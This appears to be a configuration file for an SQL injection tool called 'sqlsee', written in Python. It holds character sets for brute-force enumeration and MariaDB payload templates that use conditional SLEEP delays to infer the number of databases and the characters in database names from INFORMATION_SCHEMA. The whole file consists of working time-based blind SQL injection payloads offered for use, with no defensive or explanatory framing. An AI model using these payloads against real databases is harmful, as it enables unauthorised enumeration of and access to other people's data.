# Configuration for sqlsee
from enum import Enum


class Characters(Enum):
    """ Character sets for iteration """

    LOWER_LETTER = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']

    UPPER_LETTER = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']

    DIGITS = ['0','1','2','3','4','5','6','7','8','9']

    CHARS = ['.','/','-','_','#','!','$','&','*']

    ALL_CHARS = LOWER_LETTER + UPPER_LETTER + DIGITS + CHARS

class MariaDB(Enum):
    """ Queries for MariaDB """

    # Query to find number of databases.
    DATABASE_NUM = '(SELECT * FROM (SELECT IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) = {},(SELECT SLEEP(5)),0))GDiu)'

    # Query to find character set for database names.
    DATABASE_NAME_CHAR = '(SELECT * FROM (SELECT IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME LIKE "%{}%") > 0,(SELECT SLEEP(2)),0))GDiu)'
